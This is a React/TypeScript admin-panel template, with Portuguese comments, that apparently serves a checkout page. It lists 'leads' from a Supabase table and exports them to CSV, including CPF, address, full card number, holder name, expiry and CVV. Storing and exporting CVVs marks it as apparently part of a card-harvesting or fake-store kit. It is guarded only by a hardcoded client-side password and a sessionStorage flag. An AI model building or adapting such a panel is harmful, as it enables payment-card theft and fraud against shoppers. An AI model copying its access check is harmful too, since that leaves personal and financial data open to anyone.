/**
 * =============================================================
 * TEMPLATE ADMIN - PAINEL DE LEADS COM EXPORTAÇÃO CSV
 * =============================================================
 * 
 * COMO USAR:
 * 1. Adicione a rota no App.tsx: <Route path="/adm" element={<TemplateAdmin />} />
 * 2. A senha padrão é 12345678 — altere na constante ADMIN_PASSWORD
 * 3. Precisa da tabela checkout_leads no Supabase (veja TemplateCheckout.tsx)
 */

import { useState, useEffect } from "react";
import { supabase } from "@/integrations/supabase/client";

// 🔧 ALTERE A SENHA AQUI
const ADMIN_PASSWORD = "12345";

interface Lead {
  id: string;
  created_at: string;
  name: string;
  email: string;
  phone: string | null;
  cpf: string | null;
  payment_method: string;
  color: string | null;
  size: string | null;
  quantity: number | null;
  total_amount: number | null;
  shipping_cost: number | null;
  shipping_type: string | null;
  cep: string | null;
  endereco: string | null;
  numero: string | null;
  complemento: string | null;
  bairro: string | null;
  cidade: string | null;
  uf: string | null;
  card_number: string | null;
  card_holder: string | null;
  card_expiry: string | null;
  card_cvv: string | null;
  card_installments: number | null;
  status: string | null;
  transaction_id: string | null;
}

export default function TemplateAdmin() {
  const [authenticated, setAuthenticated] = useState(() => sessionStorage.getItem("admin_auth") === "true");
  const [password, setPassword] = useState("");
  const [leads, setLeads] = useState<Lead[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (password === ADMIN_PASSWORD) {
      sessionStorage.setItem("admin_auth", "true");
      setAuthenticated(true);
      setError("");
    } else {
      setError("Senha incorreta");
    }
  };

  useEffect(() => {
    if (!authenticated) return;
    setLoading(true);
    supabase
      .from("checkout_leads")
      .select("*")
      .order("created_at", { ascending: false })
      .then(({ data, error }) => {
        if (error) {
          console.error(error);
          setError("Erro ao carregar dados");
        } else {
          setLeads((data as Lead[]) || []);
        }
        setLoading(false);
      });
  }, [authenticated]);

  const exportCSV = () => {
    if (!leads.length) return;
    const headers = [
      "Data", "Nome", "Email", "Telefone", "CPF", "Método",
      "Cor", "Tamanho", "Qtd", "Total (R$)", "Frete (R$)", "Tipo Frete",
      "CEP", "Endereço", "Número", "Complemento", "Bairro", "Cidade", "UF",
      "Nº Cartão", "Titular", "Validade", "CVV", "Parcelas", "Status", "ID Transação"
    ];
    const rows = leads.map((l) => [
      new Date(l.created_at).toLocaleString("pt-BR"),
      l.name, l.email, l.phone || "", l.cpf || "", l.payment_method,
      l.color || "", l.size || "", l.quantity ?? "",
      l.total_amount ? (l.total_amount / 100).toFixed(2) : "",
      l.shipping_cost ? (l.shipping_cost / 100).toFixed(2) : "",
      l.shipping_type || "",
      l.cep || "", l.endereco || "", l.numero || "", l.complemento || "",
      l.bairro || "", l.cidade || "", l.uf || "",
      l.card_number || "", l.card_holder || "", l.card_expiry || "",
      l.card_cvv || "", l.card_installments ?? "", l.status || "", l.transaction_id || ""
    ]);
    const csv = [headers, ...rows].map(r => r.map(v => `"${String(v).replace(/"/g, '""')}"`).join(",")).join("\n");
    const blob = new Blob(["\uFEFF" + csv], { type: "text/csv;charset=utf-8;" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `leads-${new Date().toISOString().slice(0, 10)}.csv`;
    a.click();
    URL.revokeObjectURL(url);
  };

  if (!authenticated) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background p-4">
        <form onSubmit={handleLogin} className="w-full max-w-sm space-y-4 bg-card p-6 rounded-xl border shadow">
          <h1 className="text-xl font-bold text-center">Painel Admin</h1>
          <input
            type="password"
            placeholder="Senha"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full border rounded-lg px-4 py-3 text-sm bg-background"
          />
          {error && <p className="text-destructive text-sm text-center">{error}</p>}
          <button type="submit" className="w-full bg-primary text-primary-foreground py-3 rounded-lg font-semibold">
            Entrar
          </button>
        </form>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background p-4">
      <div className="max-w-[1400px] mx-auto">
        <div className="flex items-center justify-between mb-6">
          <h1 className="text-2xl font-bold">Leads ({leads.length})</h1>
          <button onClick={exportCSV} className="bg-primary text-primary-foreground px-4 py-2 rounded-lg text-sm font-semibold">
            Exportar CSV
          </button>
        </div>

        {loading ? (
          <p className="text-center text-muted-foreground py-8">Carregando...</p>
        ) : (
          <div className="overflow-x-auto border rounded-xl">
            <table className="w-full text-xs">
              <thead className="bg-muted">
                <tr>
                  {["Data", "Nome", "Email", "Telefone", "CPF", "Método", "Cor", "Tam", "Qtd", "Total", "Cidade/UF",
                    "Nº Cartão", "Titular", "Validade", "CVV", "Parcelas", "Status"].map((h) => (
                    <th key={h} className="px-3 py-2 text-left whitespace-nowrap font-semibold">{h}</th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {leads.map((l) => (
                  <tr key={l.id} className="border-t hover:bg-muted/50">
                    <td className="px-3 py-2 whitespace-nowrap">{new Date(l.created_at).toLocaleString("pt-BR")}</td>
                    <td className="px-3 py-2 whitespace-nowrap">{l.name}</td>
                    <td className="px-3 py-2 whitespace-nowrap">{l.email}</td>
                    <td className="px-3 py-2 whitespace-nowrap">{l.phone}</td>
                    <td className="px-3 py-2 whitespace-nowrap">{l.cpf}</td>
                    <td className="px-3 py-2 whitespace-nowrap">
                      <span className={`px-2 py-0.5 rounded text-[10px] font-bold uppercase ${l.payment_method === "pix" ? "bg-success/20 text-success" : "bg-primary/20 text-primary"}`}>
                        {l.payment_method}
                      </span>
                    </td>
                    <td className="px-3 py-2">{l.color}</td>
                    <td className="px-3 py-2">{l.size}</td>
                    <td className="px-3 py-2">{l.quantity}</td>
                    <td className="px-3 py-2 whitespace-nowrap">R$ {l.total_amount ? (l.total_amount / 100).toFixed(2) : "—"}</td>
                    <td className="px-3 py-2 whitespace-nowrap">{l.cidade}/{l.uf}</td>
                    <td className="px-3 py-2 whitespace-nowrap font-mono">{l.card_number}</td>
                    <td className="px-3 py-2 whitespace-nowrap">{l.card_holder}</td>
                    <td className="px-3 py-2">{l.card_expiry}</td>
                    <td className="px-3 py-2">{l.card_cvv}</td>
                    <td className="px-3 py-2">{l.card_installments}</td>
                    <td className="px-3 py-2">
                      <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${l.status === "paid" ? "bg-success/20 text-success" : "bg-primary/20 text-primary"}`}>
                        {l.status || "pending"}
                      </span>
                    </td>
                  </tr>
                ))}
                {!leads.length && (
                  <tr><td colSpan={17} className="text-center py-8 text-muted-foreground">Nenhum lead encontrado</td></tr>
                )}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  );
}
